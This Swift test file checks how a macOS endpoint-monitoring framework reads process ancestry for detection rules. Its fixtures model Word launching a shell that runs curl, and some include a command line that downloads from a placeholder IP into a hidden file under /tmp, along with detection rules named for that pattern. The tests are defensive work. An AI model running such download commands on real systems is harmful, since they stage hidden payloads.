//
//  LineageFieldTests.swift
//  SutroESFrameworkTests
//
//  Created by Brandon Dalton on 11/17/26.
//

import XCTest
@testable import SutroESFramework


// MARK: - An ancestor's fields
/// Pins the fields an indicator reads of an event's ancestors: their key paths, which read as a process's do, what
/// each is for a process with many ancestors, one, or none, that every kind of event has them by its process, and
/// that a rule on them matches in the Security Extension's own evaluation.
final class LineageFieldTests: XCTestCase {
    private var lineage = ProcessLineage()

    /// A table with Word, the shell it started, and curl under that: 100, 200 and 300. Each has a child, 110, 210
    /// and 310, whose events the tests evaluate.
    override func setUp() {
        super.setUp()
        lineage = ProcessLineage()
        lineage.seed([
            (program(100, "/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word", "com.microsoft.Word",
                     "UBF8T346G9", "DEVELOPER_ID"), 1),
            (program(200, "/bin/zsh", "com.apple.zsh", nil, "PLATFORM"), 100),
            (program(300, "/usr/bin/curl", "com.apple.curl", nil, "PLATFORM"), 200),
            (program(110, "/usr/bin/true"), 100), (program(210, "/usr/bin/true"), 200),
            (program(310, "/usr/bin/true"), 300), (program(400, "/usr/libexec/agent"), 1),
        ])
    }

    /// A program whose pid version is 1.
    ///
    /// - Parameters:
    ///   - pid: Its pid.
    ///   - path: Its executable's path.
    ///   - signingID: Its signing ID.
    ///   - teamID: Its team ID.
    ///   - type: How it's signed.
    /// - Returns: The program, with a command line made of its path.
    private func program(_ pid: Int32, _ path: String, _ signingID: String? = "com.apple.true",
                         _ teamID: String? = nil, _ type: String = "PLATFORM") -> ProcessProgram {
        ProcessProgram(key: ProcessKey(pid: pid, pidversion: 1), path: path, commandLine: "\(path) --run",
                       signingID: signingID, teamID: teamID, codesigningType: type)
    }

    /// An exit of a process whose pid version is 1.
    ///
    /// - Parameters:
    ///   - pid: The process's pid.
    ///   - parent: Its parent's pid, as the event names it.
    /// - Returns: The event.
    /// - Throws: If the fixture can't be read.
    private func exit(of pid: Int, parent: Int = 1) throws -> Message {
        try exitMessage(of: try esloggerProcess(pid: pid, pidversion: 1, path: "/usr/bin/true",
                                                parent: (parent, parent == 1 ? 7 : 1)))
    }

    /// Each lineage field's value on an event, by its key path, read through a lane's cache.
    ///
    /// - Parameters:
    ///   - message: The event.
    ///   - table: The lane's lineage table.
    /// - Returns: The values, as strings and arrays of strings, and `NSNull` for none.
    private func values(of message: Message, table: ProcessLineage?) -> [String: AnyHashable] {
        var cache = MessageValueCache()
        cache.lineage = table
        var values: [String: AnyHashable] = [:]
        for entry in LineageField.all {
            let field = IndicatorField(path: entry.path)
            switch field.map({ cache.value(of: $0, in: message) }) {
            case .string(let text)?: values[entry.path] = String(text)
            case .strings(let texts)?: values[entry.path] = texts
            default: values[entry.path] = NSNull()
            }
        }
        return values
    }

    /// Every field has a key path that reads as a process's does, a kind, a name, and a number after the record's
    /// direct fields. A record's own fields aren't lineage fields.
    func testTheKeyPaths() throws {
        XCTAssertEqual(LineageField.all.prefix(LineageField.perChain).map(\.path), [
            "lineage.parent.executable.path", "lineage.parent.command_line", "lineage.parent.signing_id",
            "lineage.parent.team_id", "lineage.parent.codesigning_type",
            "lineage.grandparent.executable.path", "lineage.grandparent.command_line",
            "lineage.grandparent.signing_id", "lineage.grandparent.team_id", "lineage.grandparent.codesigning_type",
            "lineage.origin.executable.path", "lineage.origin.command_line", "lineage.origin.signing_id",
            "lineage.origin.team_id", "lineage.origin.codesigning_type",
            "lineage.paths", "lineage.command_lines", "lineage.signing_ids", "lineage.team_ids",
            "lineage.codesigning_types",
        ])
        XCTAssertEqual(LineageField.all.count, LineageField.perChain * LineageField.Chain.allCases.count + 1)
        XCTAssertEqual(LineageField.all.last?.path, "lineage.process.command_line")
        XCTAssertEqual(LineageField.processOffset, LineageField.all.count - 1)
        XCTAssertEqual(LineageField.all.prefix(LineageField.processOffset).dropFirst(LineageField.perChain).map(\.path),
                       LineageField.all.prefix(LineageField.perChain).map {
                           "launched_by" + $0.path.dropFirst("lineage".count)
                       })
        for (offset, entry) in LineageField.all.enumerated() {
            let field = try XCTUnwrap(IndicatorField(path: entry.path), entry.path)
            XCTAssertTrue(field.isDirect, entry.path)
            XCTAssertEqual(field.lineageOffset, offset, entry.path)
            XCTAssertEqual(field.path, entry.path)
            XCTAssertEqual(field.kind, entry.path.hasSuffix("s") ? .strings : .string, entry.path)
            XCTAssertEqual(try IndicatorField.record(entry.path), field, entry.path)
        }
        XCTAssertEqual(IndicatorField(path: "lineage.origin.signing_id")?.description, "lineageOriginSigningID")
        XCTAssertEqual(IndicatorField(path: "lineage.paths")?.description, "lineageExecutablePaths")
        XCTAssertEqual(IndicatorField(path: "launched_by.parent.team_id")?.description, "launchedByParentTeamID")
        XCTAssertEqual(IndicatorField(path: "launched_by.paths").flatMap(\.lineageOffset).map(LineageField.chain),
                       .launchedBy)
        XCTAssertEqual(IndicatorField(path: "lineage.process.command_line")?.description, "lineageProcessCommandLine")
        XCTAssertEqual(LineageField.chain(at: LineageField.processOffset), .lineage)
        XCTAssertNil(IndicatorField(path: "launched_by.process.command_line"))
        XCTAssertNil(IndicatorField.processExecutablePath.lineageOffset)
        XCTAssertNil(IndicatorField.closeTargetName.lineageOffset)
        XCTAssertNil(IndicatorField(path: "lineage.parent.pid"))
        XCTAssertEqual(IndicatorField.allCases.count, Int(IndicatorField.execEnvCount.rawValue) + 1 + 41)
    }

    /// A process three deep has its parent, its grandparent, the first below launchd, and all three in each list.
    func testAProcessWithManyAncestors() throws {
        let values = values(of: try exit(of: 310, parent: 300), table: lineage)
        XCTAssertEqual(values["lineage.parent.executable.path"], "/usr/bin/curl")
        XCTAssertEqual(values["lineage.parent.command_line"], "/usr/bin/curl --run")
        XCTAssertEqual(values["lineage.parent.signing_id"], "com.apple.curl")
        XCTAssertEqual(values["lineage.parent.team_id"], NSNull())
        XCTAssertEqual(values["lineage.parent.codesigning_type"], "PLATFORM")
        XCTAssertEqual(values["lineage.grandparent.executable.path"], "/bin/zsh")
        XCTAssertEqual(values["lineage.grandparent.signing_id"], "com.apple.zsh")
        XCTAssertEqual(values["lineage.origin.signing_id"], "com.microsoft.Word")
        XCTAssertEqual(values["lineage.origin.team_id"], "UBF8T346G9")
        XCTAssertEqual(values["lineage.origin.codesigning_type"], "DEVELOPER_ID")
        XCTAssertEqual(values["lineage.paths"], ["/usr/bin/curl", "/bin/zsh",
                                                 "/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word"])
        XCTAssertEqual(values["lineage.signing_ids"], ["com.apple.curl", "com.apple.zsh", "com.microsoft.Word"])
        XCTAssertEqual(values["lineage.team_ids"], ["UBF8T346G9"], "Only the ancestors that have one")
        XCTAssertEqual(values["lineage.codesigning_types"], ["PLATFORM", "PLATFORM", "DEVELOPER_ID"])
        XCTAssertEqual((values["lineage.command_lines"] as? [String])?.count, 3)
    }

    /// With one ancestor, it's the parent and the first below launchd, and there's no grandparent. A child of
    /// launchd has none: every ancestor's field is `nil` and every list is empty. It still has its own command line.
    func testAProcessWithOneAncestorOrNone() throws {
        let one = values(of: try exit(of: 110, parent: 100), table: lineage)
        XCTAssertEqual(one["lineage.parent.signing_id"], "com.microsoft.Word")
        XCTAssertEqual(one["lineage.origin.signing_id"], "com.microsoft.Word")
        XCTAssertEqual(one["lineage.grandparent.signing_id"], NSNull())
        XCTAssertEqual(one["lineage.grandparent.executable.path"], NSNull())
        XCTAssertEqual(one["lineage.signing_ids"], ["com.microsoft.Word"])

        let none = values(of: try exit(of: 400), table: lineage)
        for entry in LineageField.all.prefix(LineageField.processOffset) {
            let nothing: AnyHashable = entry.kind == .strings ? [String]() : NSNull()
            XCTAssertEqual(none[entry.path], nothing, entry.path)
        }
        XCTAssertEqual(none["lineage.process.command_line"], "/usr/libexec/agent --run")
    }

    /// The event's own process's command line is read by its own key: an exit's process, the program that called an
    /// exec, and a flow's process. A process the table knows only another program of has none, though its ancestors
    /// are found by that program. A rule on it matches on a flow, and only indicators may read it.
    func testTheProcessesOwnCommandLine() throws {
        let exit = values(of: try exit(of: 310, parent: 300), table: lineage)
        XCTAssertEqual(exit["lineage.process.command_line"], "/usr/bin/true --run")
        XCTAssertEqual(exit["lineage.parent.command_line"], "/usr/bin/curl --run")

        let shell = try esloggerProcess(pid: 200, pidversion: 1, path: "/bin/zsh", parent: (100, 1))
        let target = try esloggerProcess(pid: 200, pidversion: 2, path: "/usr/bin/curl", parent: (100, 1))
        let exec = values(of: try execMessage(by: shell, of: target), table: lineage)
        XCTAssertEqual(exec["lineage.process.command_line"], "/bin/zsh --run", "The program that called exec")
        XCTAssertEqual(exec["lineage.parent.signing_id"], "com.microsoft.Word")

        let later = try exitMessage(of: try esloggerProcess(pid: 310, pidversion: 2, path: "/usr/bin/true",
                                                            parent: (300, 1)))
        let newer = values(of: later, table: lineage)
        XCTAssertEqual(newer["lineage.process.command_line"], NSNull(), "Never another program's")
        XCTAssertEqual(newer["lineage.parent.executable.path"], "/usr/bin/curl")

        lineage.seed([(ProcessProgram(key: ProcessKey(pid: 753, pidversion: 2_341), path: "/usr/bin/curl",
                                      commandLine: "curl -s -o /tmp/.x http://192.0.2.1/"), 200)])
        let flow = SyntheticFlows.message(SyntheticFlows.record(.opened, process: SyntheticFlows.process(
            pid: 753, path: "/usr/bin/curl", signingID: "com.apple.curl")))
        let rule = #"event.new_flow != nil AND lineage.process.command_line CONTAINS " -o /tmp/.""#
        let compiled = CompiledIndicators([Indicator(name: "Hidden download", description: "", symbol: "star",
                                                     color: .red, predicate: rule)])
        XCTAssertEqual(compiled.problems.map(\.reason), [])
        var cache = MessageValueCache()
        cache.lineage = lineage
        XCTAssertEqual(compiled.hits(for: flow, values: &cache).map(\.name), ["Hidden download"])

        let predicate = NSPredicate(format: #"event.close != nil AND lineage.process.command_line CONTAINS "x""#)
        XCTAssertNoThrow(try PredicateGuard.check(predicate, for: .indicator))
        for audience in [PredicateAudience.commandLine, .search] {
            XCTAssertThrowsError(try PredicateGuard.check(predicate, for: audience))
        }
    }

    /// The predicate editor completes the event's own process under `lineage` only, and says what it is.
    func testTheProcessIsCompleted() {
        XCTAssertTrue(LineageField.children(of: ["lineage"]).contains("process"))
        XCTAssertFalse(LineageField.children(of: ["launched_by"]).contains("process"))
        XCTAssertEqual(LineageField.children(of: ["lineage", "process"]), ["command_line"])
        XCTAssertEqual(LineageField.completion(of: ["lineage", "process"])?.type, "object")
        XCTAssertEqual(LineageField.completion(of: ["lineage", "process", "command_line"])?.type, "string")
        XCTAssertNil(LineageField.completion(of: ["lineage", "process", "signing_id"]))
    }

    /// Without a lineage table every field is `nil`, the lists too: nothing is known, which isn't "no ancestors".
    /// A process the table hasn't heard of takes the parent its event names.
    func testWithoutATableAndForAnUnknownProcess() throws {
        let untracked = values(of: try exit(of: 310, parent: 300), table: nil)
        XCTAssertEqual(Set(untracked.values), [NSNull()])
        for entry in LineageField.all {
            XCTAssertEqual(MessageValues.value(of: try XCTUnwrap(IndicatorField(path: entry.path)),
                                               in: try exit(of: 310, parent: 300)).isNull, true, entry.path)
        }
        let unknown = values(of: try exit(of: 999, parent: 300), table: lineage)
        XCTAssertEqual(unknown["lineage.parent.executable.path"], "/usr/bin/curl")
        XCTAssertEqual(unknown["lineage.grandparent.executable.path"], "/bin/zsh")
        XCTAssertEqual((unknown["lineage.paths"] as? [String])?.count, 3)
    }

    /// A lane's cache reads each event's own ancestors: the last event's are forgotten with its values.
    func testEachEventHasItsOwnAncestors() throws {
        var cache = MessageValueCache()
        cache.lineage = lineage
        let parent = try XCTUnwrap(IndicatorField(path: "lineage.parent.signing_id"))
        let read = { (cache: inout MessageValueCache, message: Message) -> String? in
            guard case .string(let text) = cache.value(of: parent, in: message) else { return nil }
            return String(text)
        }
        XCTAssertEqual(read(&cache, try exit(of: 310, parent: 300)), "com.apple.curl")
        XCTAssertEqual(cache.readCount, 1)
        cache.reset()
        XCTAssertEqual(read(&cache, try exit(of: 110, parent: 100)), "com.microsoft.Word")
        cache.reset()
        XCTAssertNil(read(&cache, try exit(of: 400)))
    }

    /// A rule on an ancestor matches in the Security Extension's evaluation, on any event of a descendant that the
    /// rule names the type of: a rule for anything Word started, at any depth, one for curl under a shell, and one
    /// no process here matches. A set evaluated without a lineage table matches none of them.
    func testRulesOnAncestorsMatch() throws {
        let rule = { (name: String, predicate: String) in
            Indicator(name: name, description: "", symbol: "star", color: .red, predicate: predicate)
        }
        let compiled = CompiledIndicators([
            rule("From Word", #"(event.exit != nil OR event.exec != nil) AND "#
                 + #"ANY lineage.signing_ids == "com.microsoft.Word""#),
            rule("Word's own child", #"event.exit != nil AND lineage.parent.signing_id == "com.microsoft.Word""#),
            rule("Curl under a shell", #"event.exit != nil AND lineage.parent.executable.path ENDSWITH "/curl" AND "#
                 + #"lineage.grandparent.executable.path IN {"/bin/zsh", "/bin/bash", "/bin/sh"}"#),
            rule("Started by an app", #"lineage.origin.codesigning_type == "DEVELOPER_ID" AND "#
                 + #"es_event_type == "ES_EVENT_TYPE_NOTIFY_EXIT""#),
            rule("From Excel", #"event.exit != nil AND ANY lineage.paths CONTAINS "Microsoft Excel""#),
        ])
        XCTAssertEqual(compiled.problems.map(\.reason), [])
        var cache = MessageValueCache()
        cache.lineage = lineage
        let names = { (cache: inout MessageValueCache, message: Message) in
            compiled.hits(for: message, values: &cache).map(\.name)
        }
        XCTAssertEqual(names(&cache, try exit(of: 310, parent: 300)),
                       ["From Word", "Curl under a shell", "Started by an app"])
        XCTAssertEqual(names(&cache, try exit(of: 210, parent: 200)), ["From Word", "Started by an app"])
        XCTAssertEqual(names(&cache, try exit(of: 110, parent: 100)),
                       ["From Word", "Word's own child", "Started by an app"])
        XCTAssertEqual(names(&cache, try exit(of: 400)), [])

        let shell = try esloggerProcess(pid: 210, pidversion: 1, path: "/bin/zsh", parent: (200, 1))
        let target = try esloggerProcess(pid: 210, pidversion: 2, path: "/usr/bin/true", parent: (200, 1))
        XCTAssertEqual(names(&cache, try execMessage(by: shell, of: target)), ["From Word"],
                       "An exec has its process's ancestors")

        var untracked = MessageValueCache()
        XCTAssertEqual(names(&untracked, try exit(of: 310, parent: 300)), [])
    }

    /// A network flow's process has its ancestors, by its audit token, as an Endpoint Security event's process does.
    /// A rule on a flow reads curl's parent and the app that started its chain, on its new_flow and its flow_closed.
    /// A flow whose process was gone before its socket was reported has no token, so no ancestors. One whose process
    /// the table hasn't heard of yet, though it's running, has its ancestors read from the system.
    func testAFlowsProcessHasItsAncestors() throws {
        lineage.seed([(ProcessProgram(key: ProcessKey(pid: 753, pidversion: 2_341), path: "/usr/bin/curl",
                                      commandLine: "curl -s http://192.0.2.1/", signingID: "com.apple.curl",
                                      codesigningType: "PLATFORM"), 200)])
        let curl = SyntheticFlows.process(pid: 753, path: "/usr/bin/curl", signingID: "com.apple.curl")
        let opened = SyntheticFlows.message(SyntheticFlows.record(.opened, process: curl))
        let values = values(of: opened, table: lineage)
        XCTAssertEqual(values["lineage.parent.executable.path"], "/bin/zsh")
        XCTAssertEqual(values["lineage.parent.command_line"], "/bin/zsh --run")
        XCTAssertEqual(values["lineage.grandparent.signing_id"], "com.microsoft.Word")
        XCTAssertEqual(values["lineage.origin.team_id"], "UBF8T346G9")
        XCTAssertEqual(values["launched_by.parent.executable.path"], "/bin/zsh")
        XCTAssertEqual((values["lineage.command_lines"] as? [String])?.count, 2)

        let compiled = CompiledIndicators([Indicator(
            name: "Flow from Word", description: "", symbol: "star", color: .red,
            predicate: #"(event.new_flow != nil OR event.flow_closed != nil) AND "#
                + #"lineage.parent.command_line CONTAINS "zsh" AND ANY lineage.signing_ids == "com.microsoft.Word""#)])
        XCTAssertEqual(compiled.problems.map(\.reason), [])
        var cache = MessageValueCache()
        cache.lineage = lineage
        let closed = SyntheticFlows.message(SyntheticFlows.record(.closed, process: curl))
        for flow in [opened, closed] {
            XCTAssertEqual(compiled.hits(for: flow, values: &cache).map(\.name), ["Flow from Word"])
            cache.reset()
        }
        let reaped = SyntheticFlows.message(SyntheticFlows.record(.opened,
                                                                  process: SyntheticFlows.process(state: .reaped)))
        XCTAssertEqual(compiled.hits(for: reaped, values: &cache).map(\.name), [])
        XCTAssertEqual(Set(self.values(of: reaped, table: lineage).values), [NSNull(), [String]()])

        let reading = ProcessLineage(reader: { pid in
            pid == 754 ? (ProcessProgram(key: ProcessKey(pid: 754, pidversion: 2_341), path: "/usr/bin/curl"), 200)
                : nil
        })
        reading.seed([(program(100, "/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word",
                               "com.microsoft.Word", "UBF8T346G9", "DEVELOPER_ID"), 1),
                      (program(200, "/bin/zsh", "com.apple.zsh", nil, "PLATFORM"), 100)])
        let unknown = SyntheticFlows.message(SyntheticFlows.record(.opened, process: SyntheticFlows.process(
            pid: 754, path: "/usr/bin/curl", signingID: "com.apple.curl")))
        let read = self.values(of: unknown, table: reading)
        XCTAssertEqual(read["lineage.parent.executable.path"], "/bin/zsh", "Read from the system, as it's running")
        XCTAssertEqual(read["lineage.origin.signing_id"], "com.microsoft.Word")
    }

    /// The launched-by chain follows who really caused each process to run: an XPC service launchd forked has no
    /// Unix ancestors, and its host app as its launched-by parent, with the app's own ancestors behind it. A process
    /// with no launched-by parent of its own has the same ancestors along both chains.
    func testTheLaunchedByChain() throws {
        let service = ProcessKey(pid: 500, pidversion: 2)
        lineage.fork(ProcessKey(pid: 500, pidversion: 1), from: ProcessKey(pid: 1, pidversion: 7))
        lineage.exec(program(500, "/System/Library/XPCServices/Helper.xpc/Contents/MacOS/Helper"),
                     replacing: ProcessKey(pid: 500, pidversion: 1), launchedBy: ProcessKey(pid: 100, pidversion: 1),
                     at: 0)
        XCTAssertNil(lineage.program(service))
        lineage.exec(ProcessProgram(key: service, path: "/Helper"), replacing: ProcessKey(pid: 500, pidversion: 1),
                     launchedBy: ProcessKey(pid: 200, pidversion: 1), at: 0)
        let event = try exitMessage(of: try esloggerProcess(pid: 500, pidversion: 2, path: "/Helper",
                                                            parent: (1, 7)))
        let values = values(of: event, table: lineage)
        XCTAssertEqual(values["lineage.parent.executable.path"], NSNull())
        XCTAssertEqual(values["lineage.paths"], [String]())
        XCTAssertEqual(values["launched_by.parent.executable.path"], "/bin/zsh")
        XCTAssertEqual(values["launched_by.grandparent.signing_id"], "com.microsoft.Word")
        XCTAssertEqual(values["launched_by.origin.team_id"], "UBF8T346G9")
        XCTAssertEqual(values["launched_by.signing_ids"], ["com.apple.zsh", "com.microsoft.Word"])

        let plain = self.values(of: try exit(of: 310, parent: 300), table: lineage)
        for entry in LineageField.all.prefix(LineageField.perChain) {
            XCTAssertEqual(plain["launched_by" + entry.path.dropFirst("lineage".count)], plain[entry.path],
                           entry.path)
        }
    }

    /// Only an indicator's predicate may name an ancestor's field: a stream's filter and the window's search compare
    /// records, which don't have them, and say so. An indicator names its event types as any other does.
    func testOnlyIndicatorsReadAncestors() throws {
        let predicate = NSPredicate(format: #"event.create != nil AND ANY lineage.signing_ids == "com.example""#)
        XCTAssertNoThrow(try PredicateGuard.check(predicate, for: .indicator))
        for audience in [PredicateAudience.commandLine, .search] {
            XCTAssertThrowsError(try PredicateGuard.check(predicate, for: audience)) { error in
                XCTAssertTrue("\(error)".contains("are read by indicators"), "\(error)")
            }
        }
        XCTAssertThrowsError(try PredicateGuard.check(NSPredicate(format: #"lineage.parent.pid == 5"#),
                                                    for: .indicator))
        let untyped = CompiledIndicators([Indicator(name: "Any event", description: "", symbol: "star", color: .red,
                                                    predicate: #"lineage.parent.signing_id == "com.example""#)])
        XCTAssertEqual(untyped.problems.count, 1)
    }

    /// A lane stamps an event with the rules its ancestors match, from the table it's given, and with none of
    /// them when it's given no table.
    func testALaneStampsWithItsTable() throws {
        let compiled = CompiledIndicators([Indicator(
            name: "From Word", description: "", symbol: "star", color: .red,
            predicate: #"event.exit != nil AND ANY lineage.signing_ids == "com.microsoft.Word""#)])
        let lane = LaneIndicators()
        var event = try exit(of: 310, parent: 300)
        lane.stamp(&event, with: compiled, chains: nil, lineage: lineage)
        XCTAssertEqual(event.indicators?.hits.map(\.name), ["From Word"])
        lane.stamp(&event, with: compiled, chains: nil)
        XCTAssertEqual(event.indicators?.hits.map(\.name), [])
    }
}
